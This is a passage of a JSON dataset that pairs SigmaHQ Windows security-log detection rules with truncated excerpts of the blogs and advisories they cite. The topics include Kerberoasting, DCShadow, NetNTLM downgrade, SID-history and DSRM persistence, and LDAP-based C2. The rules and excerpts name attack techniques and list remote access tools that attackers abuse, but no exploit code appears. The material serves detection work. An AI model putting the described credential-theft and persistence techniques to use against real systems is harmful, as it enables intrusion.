      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The advanced audit policy setting \"Object Access > Audit Removable Storage\" must be configured for Success/Failure"
      },
      "detection": {
        "selection": {
          "EventID": 4663,
          "ObjectServer": "Security",
          "ObjectType": "File",
          "ObjectName|startswith": "\\Device\\CdRom"
        },
        "filter_main_generic": {
          "ObjectName": [
            "\\Device\\CdRom0\\autorun.ico",
            "\\Device\\CdRom0\\setup.exe",
            "\\Device\\CdRom0\\setup64.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Software installation ISO files"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_iso_mount.yml"
  },
  "766": {
    "url": "https://twitter.com/MsftSecIntel/status/1257324139515269121",
    "markdown": "# Post May 4, 2020 We also saw a campaign targeting manufacturing companies in South Korea. Attackers sent target organizations an email that impersonates CDC’s Health Alert Network (HAN) and carrying malicious ISO file attachments. The ISO file contains a malicious SCR file, which is Remcos. ```image Description: The image is a screenshot of an email purportedly from the CDC Health Alert Network, dated February 24, 2020. The email discusses the outbreak of the novel coronavirus (2019-nCoV) and includes a request for the recipient to download an attachment, labeled 'CDCHAN-00815.iso', which is likely malicious. The email features a formal structure",
    "sigma_rule": {
      "title": "ISO Image Mounted",
      "id": "0248a7bc-8a9a-4cd8-a57e-3ae8e073a073",
      "status": "test",
      "description": "Detects the mount of an ISO image on an endpoint",
      "references": [
        "https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore",
        "https://www.proofpoint.com/us/blog/threat-insight/threat-actor-profile-ta2719-uses-colorful-lures-deliver-rats-local-languages",
        "https://twitter.com/MsftSecIntel/status/1257324139515269121",
        "https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1553.005/T1553.005.md#atomic-test-1---mount-iso-image"
      ],
      "author": "Syed Hasan (@syedhasan009)",
      "date": "2021-05-29",
      "modified": "2023-11-09",
      "tags": [
        "attack.initial-access",
        "attack.t1566.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The advanced audit policy setting \"Object Access > Audit Removable Storage\" must be configured for Success/Failure"
      },
      "detection": {
        "selection": {
          "EventID": 4663,
          "ObjectServer": "Security",
          "ObjectType": "File",
          "ObjectName|startswith": "\\Device\\CdRom"
        },
        "filter_main_generic": {
          "ObjectName": [
            "\\Device\\CdRom0\\autorun.ico",
            "\\Device\\CdRom0\\setup.exe",
            "\\Device\\CdRom0\\setup64.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Software installation ISO files"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_iso_mount.yml"
  },
  "767": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1553.005/T1553.005.md#atomic-test-1---mount-iso-image",
    "markdown": "# T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass ## Description from ATT&CK Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named `Zone.Identifier` with a specific value known as the MOTW. Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that",
    "sigma_rule": {
      "title": "ISO Image Mounted",
      "id": "0248a7bc-8a9a-4cd8-a57e-3ae8e073a073",
      "status": "test",
      "description": "Detects the mount of an ISO image on an endpoint",
      "references": [
        "https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore",
        "https://www.proofpoint.com/us/blog/threat-insight/threat-actor-profile-ta2719-uses-colorful-lures-deliver-rats-local-languages",
        "https://twitter.com/MsftSecIntel/status/1257324139515269121",
        "https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1553.005/T1553.005.md#atomic-test-1---mount-iso-image"
      ],
      "author": "Syed Hasan (@syedhasan009)",
      "date": "2021-05-29",
      "modified": "2023-11-09",
      "tags": [
        "attack.initial-access",
        "attack.t1566.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The advanced audit policy setting \"Object Access > Audit Removable Storage\" must be configured for Success/Failure"
      },
      "detection": {
        "selection": {
          "EventID": 4663,
          "ObjectServer": "Security",
          "ObjectType": "File",
          "ObjectName|startswith": "\\Device\\CdRom"
        },
        "filter_main_generic": {
          "ObjectName": [
            "\\Device\\CdRom0\\autorun.ico",
            "\\Device\\CdRom0\\setup.exe",
            "\\Device\\CdRom0\\setup64.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Software installation ISO files"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_iso_mount.yml"
  },
  "768": {
    "url": "https://www.trustedsec.com/blog/art_of_kerberoast/",
    "markdown": "# The Art of Detecting Kerberoast Attacks **Date:** May 10, 2018 --- As a former defender, there is a sense of “happiness” when I can put defenses in place that allow you to detect attacks and potential indicators of compromise (IoC). It's like those old spy toys you would get as a kid that had the \"laser\" light and would make a sound if the light beam was tripped. I felt so powerful because I had an early warning system when someone entered my room. In the realm of defensive controls, early warning detections are key. If you can gain",
    "sigma_rule": {
      "title": "Kerberoasting Activity - Initial Query",
      "id": "d04ae2b8-ad54-4de0-bd87-4bc1da66aa59",
      "status": "test",
      "description": "This rule will collect the data needed to start looking into possible kerberoasting activity.\nFurther analysis or computation within the query is needed focusing on requests from one specific host/IP towards multiple service names within a time period of 5 seconds.\nYou can then set a threshold for the number of requests and time between the requests to turn this into an alert.\n",
      "references": [
        "https://www.trustedsec.com/blog/art_of_kerberoast/",
        "https://adsecurity.org/?p=3513"
      ],
      "author": "@kostastsale",
      "date": "2022-01-21",
      "tags": [
        "attack.credential-access",
        "attack.t1558.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4769,
          "Status": "0x0",
          "TicketEncryptionType": "0x17"
        },
        "filter_main_": {
          "ServiceName|endswith": [
            "krbtgt",
            "$"
          ],
          "TargetUserName|contains": "$@"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legacy applications."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_kerberoasting_activity.yml"
  },
  "769": {
    "url": "https://adsecurity.org/?p=3513",
    "markdown": "# Detecting Kerberoasting Activity Part 2 – Creating a Kerberoast Service Account Honeypot *Feb 08, 2017* *Categories: ActiveDirectorySecurity, Microsoft Security, Technical Reference* In my previous post, “Detecting Kerberoasting Activity” I explain how Kerberoasting works and describe how to detect potential Kerberoasting activity. The trick to this is understanding what activity is normal in order to filter out the noise and increase the fidelity of the alert. This post describes how to filter from millions of events to a single one to detect Kerberoasting activity. ## Detecting Kerberoasting Activity As I noted in the previous post, looking for TGS service tickets",
    "sigma_rule": {
      "title": "Kerberoasting Activity - Initial Query",
      "id": "d04ae2b8-ad54-4de0-bd87-4bc1da66aa59",
      "status": "test",
      "description": "This rule will collect the data needed to start looking into possible kerberoasting activity.\nFurther analysis or computation within the query is needed focusing on requests from one specific host/IP towards multiple service names within a time period of 5 seconds.\nYou can then set a threshold for the number of requests and time between the requests to turn this into an alert.\n",
      "references": [
        "https://www.trustedsec.com/blog/art_of_kerberoast/",
        "https://adsecurity.org/?p=3513"
      ],
      "author": "@kostastsale",
      "date": "2022-01-21",
      "tags": [
        "attack.credential-access",
        "attack.t1558.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4769,
          "Status": "0x0",
          "TicketEncryptionType": "0x17"
        },
        "filter_main_": {
          "ServiceName|endswith": [
            "krbtgt",
            "$"
          ],
          "TargetUserName|contains": "$@"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legacy applications."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_kerberoasting_activity.yml"
  },
  "770": {
    "url": "https://web.archive.org/web/20200530033850/https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks",
    "markdown": "# Post Exploitation Using NetNTLM Downgrade Attacks **October 04, 2012** I love to pass the hash and steal tokens as much as the next pentester, but sometimes it’s nice to have the actual password for a user. Here are some cases where having the password, instead of just the hash, is helpful: - Web Based VPN Login - GUI Access - Third Party AD Integrated Management Tools - Database Authentication - Passwords Shared Across Multiple Systems (Unix/Linux, Network Gear, etc) The easiest way to go from SYSTEM on a box to dumping the cleartext passwords for all the users is",
    "sigma_rule": {
      "title": "NetNTLM Downgrade Attack",
      "id": "d3abac66-f11c-4ed0-8acb-50cc29c97eed",
      "related": [
        {
          "id": "d67572a0-e2ec-45d6-b8db-c100d14b8ef2",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects NetNTLM downgrade attack",
      "references": [
        "https://web.archive.org/web/20200530033850/https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks"
      ],
      "author": "Florian Roth (Nextron Systems), wagga",
      "date": "2018-03-20",
      "modified": "2022-10-09",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "Requirements: Audit Policy : Object Access > Audit Registry (Success)"
      },
      "detection": {
        "selection": {
          "EventID": 4657,
          "ObjectName|contains|all": [
            "\\REGISTRY\\MACHINE\\SYSTEM",
            "ControlSet",
            "\\Control\\Lsa"
          ],
          "ObjectValueName": [
            "LmCompatibilityLevel",
            "NtlmMinClientSec",
            "RestrictSendingNTLMTraffic"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_net_ntlm_downgrade.yml"
  },
  "771": {
    "url": "https://twitter.com/gentilkiwi/status/1003236624925413376",
    "markdown": "# Post Aug 29, 2015 A quick & dirty #Splunk search to detect basic #mimikatz DCSync with DC security events: https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2 (specify your index!) Seems to detect normal account, golden & silver ticket usage to DCSync. One exception: https://x.com/gentilkiwi/status/637402457740562432 (with the original meme inside 🙃) ```image Description: The image is a screenshot of a DC Sync log, displaying a table with detailed information about user authentication events. It includes columns such as DateTime, Computer, DSUserId, DSDomainName, DSUserName, DSObjectType, DSStatus, Logon ID, Logon Time, Authentication Package Name, Source Workstation, and Source Port. The log entries show various user actions, their success",
    "sigma_rule": {
      "title": "Possible DC Shadow Attack",
      "id": "32e19d25-4aed-4860-a55a-be99cb0bf7ed",
      "related": [
        {
          "id": "611eab06-a145-4dfa-a295-3ccc5c20f59a",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects DCShadow via create new SPN",
      "references": [
        "https://twitter.com/gentilkiwi/status/1003236624925413376",
        "https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2",
        "https://web.archive.org/web/20180203014709/https://blog.alsid.eu/dcshadow-explained-4510f52fc19d?gi=c426ac876c48"
      ],
      "author": "Ilyas Ochkov, oscd.community, Chakib Gzenayi (@Chak092), Hosni Mribah",
      "date": "2019-10-25",
      "modified": "2022-10-17",
      "tags": [
        "attack.credential-access",
        "attack.t1207"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The \"Audit Directory Service Changes\" logging policy must be configured in order to receive events. Audit events are generated only for objects with configured system access control lists (SACLs). Audit events are generated only for objects with configured system access control lists (SACLs) and only when accessed in a manner that matches their SACL settings. This policy covers the following events ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)"
      },
      "detection": {
        "selection1": {
          "EventID": 4742,
          "ServicePrincipalNames|contains": "GC/"
        },
        "selection2": {
          "EventID": 5136,
          "AttributeLDAPDisplayName": "servicePrincipalName",
          "AttributeValue|startswith": "GC/"
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Valid on domain controllers; exclude known DCs"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_possible_dc_shadow.yml"
  },
  "772": {
    "url": "https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2",
    "markdown": "# dcsync-dcshadow.splunk ``` sourcetype=XmlWinEventLog:Security AND EventCode=4662 AND NOT (SubjectUserSid=\"AUTORITE NT\\\\*\" OR SubjectDomainName=\"Window Manager\") ( (ObjectType=\"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}\" OR ObjectType=\"domainDNS\") AND (Properties=\"*Replicating Directory Changes All*\" OR Properties=\"*{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}*\" OR Properties = \"*{9923a32a-3607-11d2-b9be-0000f87a36b2}*\" OR Properties = \"*{1131f6ac-9c07-11d1-f79f-00c04fc2dcd2}*\") ) | rename _time AS DSTime, SubjectUserSid AS DSUserSid, SubjectDomainName AS DSDomainName, SubjectUserName AS DSUserName, SubjectLogonId AS DSLogonId, ObjectType AS DSObjectType, ObjectName AS DSObjectName, Properties AS DSProperties status AS DSStatus | join type=left Computer, DSLogonId [ search sourcetype=XmlWinEventLog:Security AND EventCode=4624 NOT (TargetUserSid=\"AUTORITE NT\\\\*\" OR TargetDomainName=\"Window Manager\") | rename _time AS LogonTime, TargetLogonId AS DSLogonId ] | convert timeformat=\"%d/%m/%Y %H:%M:%S\" ctime(DSTime), ctime(LogonTime) | table DSTime, Computer, DSUserSid, DSDomainName, DSUserName,",
    "sigma_rule": {
      "title": "Possible DC Shadow Attack",
      "id": "32e19d25-4aed-4860-a55a-be99cb0bf7ed",
      "related": [
        {
          "id": "611eab06-a145-4dfa-a295-3ccc5c20f59a",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects DCShadow via create new SPN",
      "references": [
        "https://twitter.com/gentilkiwi/status/1003236624925413376",
        "https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2",
        "https://web.archive.org/web/20180203014709/https://blog.alsid.eu/dcshadow-explained-4510f52fc19d?gi=c426ac876c48"
      ],
      "author": "Ilyas Ochkov, oscd.community, Chakib Gzenayi (@Chak092), Hosni Mribah",
      "date": "2019-10-25",
      "modified": "2022-10-17",
      "tags": [
        "attack.credential-access",
        "attack.t1207"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The \"Audit Directory Service Changes\" logging policy must be configured in order to receive events. Audit events are generated only for objects with configured system access control lists (SACLs). Audit events are generated only for objects with configured system access control lists (SACLs) and only when accessed in a manner that matches their SACL settings. This policy covers the following events ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)"
      },
      "detection": {
        "selection1": {
          "EventID": 4742,
          "ServicePrincipalNames|contains": "GC/"
        },
        "selection2": {
          "EventID": 5136,
          "AttributeLDAPDisplayName": "servicePrincipalName",
          "AttributeValue|startswith": "GC/"
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Valid on domain controllers; exclude known DCs"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_possible_dc_shadow.yml"
  },
  "773": {
    "url": "https://web.archive.org/web/20180203014709/https://blog.alsid.eu/dcshadow-explained-4510f52fc19d?gi=c426ac876c48",
    "markdown": "# DCShadow explained: A technical deep dive into the latest AD attack technique On January 24th 2018, Benjamin Delpy and Vincent Le Toux, two security researchers, have released during the “BlueHat IL” security conference a new attack technique against Active Directory infrastructure. Named “DCShadow”, this attack allows an attacker having the appropriate rights to create a rogue domain controller able to replicate malicious objects into a running Active Directory infrastructure. In this article, we will explain the technical foundations the attack relies on and discuss the consequences for the security of a running Active Directory infrastructure. Finally, we will shed",
    "sigma_rule": {
      "title": "Possible DC Shadow Attack",
      "id": "32e19d25-4aed-4860-a55a-be99cb0bf7ed",
      "related": [
        {
          "id": "611eab06-a145-4dfa-a295-3ccc5c20f59a",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects DCShadow via create new SPN",
      "references": [
        "https://twitter.com/gentilkiwi/status/1003236624925413376",
        "https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2",
        "https://web.archive.org/web/20180203014709/https://blog.alsid.eu/dcshadow-explained-4510f52fc19d?gi=c426ac876c48"
      ],
      "author": "Ilyas Ochkov, oscd.community, Chakib Gzenayi (@Chak092), Hosni Mribah",
      "date": "2019-10-25",
      "modified": "2022-10-17",
      "tags": [
        "attack.credential-access",
        "attack.t1207"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The \"Audit Directory Service Changes\" logging policy must be configured in order to receive events. Audit events are generated only for objects with configured system access control lists (SACLs). Audit events are generated only for objects with configured system access control lists (SACLs) and only when accessed in a manner that matches their SACL settings. This policy covers the following events ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)"
      },
      "detection": {
        "selection1": {
          "EventID": 4742,
          "ServicePrincipalNames|contains": "GC/"
        },
        "selection2": {
          "EventID": 5136,
          "AttributeLDAPDisplayName": "servicePrincipalName",
          "AttributeValue|startswith": "GC/"
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Valid on domain controllers; exclude known DCs"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_possible_dc_shadow.yml"
  },
  "774": {
    "url": "https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1",
    "markdown": "# Hunting in Active Directory: Unconstrained Delegation & Forests Trusts During DerbyCon 2018 this past October, my teammates @tifkin_, @enigma0x3 and @harmj0y gave an awesome presentation titled “The Unintended Risks of Trusting Active Directory”. They demonstrated how an adversary could coerce a domain controller (DC) to authenticate to a server configured with unconstrained delegation, capture the domain controller’s Ticket-Granting-Ticket (TGT), and export the TGT in order to impersonate the DC and perform attacks such as DCSync to request any domain user’s password. For their talk, this use case was presented in the context of one forest with multiple sub-domains; however,",
    "sigma_rule": {
      "title": "Register new Logon Process by Rubeus",
      "id": "12e6d621-194f-4f59-90cc-1959e21e69f7",
      "status": "test",
      "description": "Detects potential use of Rubeus via registered new trusted logon process",
      "references": [
        "https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1"
      ],
      "author": "Roberto Rodriguez (source), Ilyas Ochkov (rule), oscd.community",
      "date": "2019-10-24",
      "modified": "2022-10-09",
      "tags": [
        "attack.lateral-movement",
        "attack.privilege-escalation",
        "attack.credential-access",
        "attack.t1558.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4611,
          "LogonProcessName": "User32LogonProcesss"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_register_new_logon_process_by_rubeus.yml"
  },
  "775": {
    "url": "https://redcanary.com/blog/threat-detection/misbehaving-rats/",
    "markdown": "# Remote access tool or trojan? How to detect misbehaving RATs The only difference between a remote administration tool and a remote access trojan (RAT) is who’s controlling it. Originally published: August 19, 2021. Last modified: October 1, 2024. --- Red Canary’s Cyber Incident Response Team frequently observes adversaries abusing legitimate remote access utilities for lateral movement and execution of payloads. These tools perform reliably, as you may expect with most enterprise software, and allow operators to pivot and transfer data to and from victim machines. Adversarial abuse of remote monitoring & management (RMM) software is not new, but—given the",
    "sigma_rule": {
      "title": "Remote Access Tool Services Have Been Installed - Security",
      "id": "c8b00925-926c-47e3-beea-298fd563728e",
      "related": [
        {
          "id": "1a31b18a-f00c-4061-9900-f735b96c99fc",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects service installation of different remote access tools software. These software are often abused by threat actors to perform",
      "references": [
        "https://redcanary.com/blog/threat-detection/misbehaving-rats/"
      ],
      "author": "Connor Martin, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-12-23",
      "modified": "2024-12-07",
      "tags": [
        "attack.persistence",
        "attack.t1543.003",
        "attack.t1569.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697"
      },
      "detection": {
        "selection": {
          "EventID": 4697,
          "ServiceName|contains": [
            "AmmyyAdmin",
            "AnyDesk",
            "Atera",
            "BASupportExpressSrvcUpdater",
            "BASupportExpressStandaloneService",
            "chromoting",
            "GoToAssist",
            "GoToMyPC",
            "jumpcloud",
            "LMIGuardianSvc",
            "LogMeIn",
            "monblanking",
            "Parsec",
            "RManService",
            "RPCPerformanceService",
            "RPCService",
            "SplashtopRemoteService",
            "SSUService",
            "TeamViewer",
            "TightVNC",
            "vncserver",
            "Zoho"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "The rule doesn't look for anything suspicious so false positives are expected. If you use one of the tools mentioned, comment it out"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_service_install_remote_access_software.yml"
  },
  "776": {
    "url": "https://adsecurity.org/?p=1772",
    "markdown": "# Sneaky Active Directory Persistence #14: SID History *September 19, 2015* *Categories: ActiveDirectorySecurity, Microsoft Security, Security Conference Presentation/Video* The content in this post describes a method by which an attacker could persist administrative access to Active Directory after having Domain Admin level rights for 5 minutes. I presented on this AD persistence method in Las Vegas at DEF CON 23 (2015). Complete list of Sneaky Active Directory Persistence Tricks posts SID History is an attribute that supports migration scenarios. Every user account has an associated Security IDentifier (SID) which is used to track the security principal and the access the",
    "sigma_rule": {
      "title": "Addition of SID History to Active Directory Object",
      "id": "2632954e-db1c-49cb-9936-67d1ef1d17d2",
      "status": "stable",
      "description": "An attacker can use the SID history attribute to gain additional privileges.",
      "references": [
        "https://adsecurity.org/?p=1772"
      ],
      "author": "Thomas Patzke, @atc_project (improvements)",
      "date": "2017-02-19",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1134.005"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection1": {
          "EventID": [
            4765,
            4766
          ]
        },
        "selection2": {
          "EventID": 4738
        },
        "selection3": {
          "SidHistory": [
            "-",
            "%%1793"
          ]
        },
        "filter_null": {
          "SidHistory": null
        },
        "condition": "selection1 or (selection2 and not selection3 and not filter_null)"
      },
      "falsepositives": [
        "Migration of an account into a new domain"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_add_sid_history.yml"
  },
  "777": {
    "url": "https://adsecurity.org/?p=1714",
    "markdown": "# Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM) *September 10, 2015* *Categories: ActiveDirectorySecurity, Microsoft Security, Security Conference Presentation/Video, Technical Reference* The content in this post describes a method by which an attacker could persist administrative access to Active Directory after having Domain Admin level rights for 5 minutes. I presented on this AD persistence method in Las Vegas at DEF CON 23 (2015). Complete list of Sneaky Active Directory Persistence Tricks posts ## The Directory Restore Mode Account Every Domain Controller has an internal “Break glass” local administrator account to DC called the Directory Services Restore Mode",
    "sigma_rule": {
      "title": "Password Change on Directory Service Restore Mode (DSRM) Account",
      "id": "53ad8e36-f573-46bf-97e4-15ba5bf4bb51",
      "related": [
        {
          "id": "b61e87c0-50db-4b2e-8986-6a2be94b33b0",
          "type": "similar"
        }
      ],
      "status": "stable",
      "description": "Detects potential attempts made to set the Directory Services Restore Mode administrator password.\nThe Directory Service Restore Mode (DSRM) account is a local administrator account on Domain Controllers.\nAttackers may change the password in order to obtain persistence.\n",
      "references": [
        "https://adsecurity.org/?p=1714",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4794"
      ],
      "author": "Thomas Patzke",
      "date": "2017-02-19",
      "modified": "2020-08-23",
      "tags": [
        "attack.persistence",
        "attack.t1098"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4794
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Initial installation of a domain controller."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_dsrm_password_change.yml"
  },
  "778": {
    "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4794",
    "markdown": "# 4794(S, F): An attempt was made to set the Directory Services Restore Mode administrator password. **Article** **Date:** 09/07/2021 ```image Alt: Event 4794 illustration Description: | The image displays a Windows Event Properties window for Event ID 4794, which documents an attempt to set the Directory Services Restore Mode administrator password. The window is divided into sections providing detailed information: - The 'General' section summarizes the event, including the Security ID (CONTOSO\\dadmin), Account Name (dadmin), Account Domain (CONTOSO), and Logon ID (0x36F67). - The 'Additional Information' section lists the Caller Workstation (DC01) and the Status Code (0x0). - At the",
    "sigma_rule": {
      "title": "Password Change on Directory Service Restore Mode (DSRM) Account",
      "id": "53ad8e36-f573-46bf-97e4-15ba5bf4bb51",
      "related": [
        {
          "id": "b61e87c0-50db-4b2e-8986-6a2be94b33b0",
          "type": "similar"
        }
      ],
      "status": "stable",
      "description": "Detects potential attempts made to set the Directory Services Restore Mode administrator password.\nThe Directory Service Restore Mode (DSRM) account is a local administrator account on Domain Controllers.\nAttackers may change the password in order to obtain persistence.\n",
      "references": [
        "https://adsecurity.org/?p=1714",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4794"
      ],
      "author": "Thomas Patzke",
      "date": "2017-02-19",
      "modified": "2020-08-23",
      "tags": [
        "attack.persistence",
        "attack.t1098"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4794
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Initial installation of a domain controller."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_dsrm_password_change.yml"
  },
  "779": {
    "url": "https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961",
    "markdown": "# Detecting LDAPFragger — A newly released Cobalt Strike Beacon using LDAP for C2 communication (blueteamers approach) **Mar 24, 2020** ## Goals: - trying to understand how the tool works - trying to find further detections as blueteamer for a newly released tool - find an efficient detection rule which can be implemented in large scale environment quickly ## After LDAPFragger (introduction blogpost) has been at Github (03–19–2020) I immediately took some views into its capabilities and design. When a new tool for red-teamers has been released, our job as blueteamer is to get up, understand it, test it in",
    "sigma_rule": {
      "title": "Suspicious LDAP-Attributes Used",
      "id": "d00a9a72-2c09-4459-ad03-5e0a23351e36",
      "status": "test",
      "description": "Detects the usage of particular AttributeLDAPDisplayNames, which are known for data exchange via LDAP by the tool LDAPFragger and are additionally not commonly used in companies.",
      "references": [
        "https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961",
        "https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/",
        "https://github.com/fox-it/LDAPFragger"
      ],
      "author": "xknow @xknow_infosec",
      "date": "2019-03-24",
      "modified": "2022-10-05",
      "tags": [
        "attack.t1001.003",
        "attack.command-and-control"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The \"Audit Directory Service Changes\" logging policy must be configured in order to receive events. Audit events are generated only for objects with configured system access control lists (SACLs). Audit events are generated only for objects with configured system access control lists (SACLs) and only when accessed in a manner that matches their SACL settings. This policy covers the following events ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)"
      },
      "detection": {
        "selection": {
          "EventID": 5136,
          "AttributeValue|contains": "*",
          "AttributeLDAPDisplayName": [
            "primaryInternationalISDNNumber",
            "otherFacsimileTelephoneNumber",
            "primaryTelexNumber"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Companies, who may use these default LDAP-Attributes for personal information"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_ldap_dataexchange.yml"
  },
  "780": {
    "url": "https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/",
    "markdown": "# LDAPFragger: Command and Control over LDAP attributes ## Introduction A while back during a penetration test of an internal network, we encountered physically segmented networks. These networks contained workstations joined to the same Active Directory domain, however only one network segment could connect to the internet. To control workstations in both segments remotely with Cobalt Strike, we built a tool that uses the shared Active Directory component to build a communication channel. For this, it uses the LDAP protocol which is commonly used to manage Active Directory, effectively routing beacon data over LDAP. This blogpost will go into detail",
    "sigma_rule": {
      "title": "Suspicious LDAP-Attributes Used",
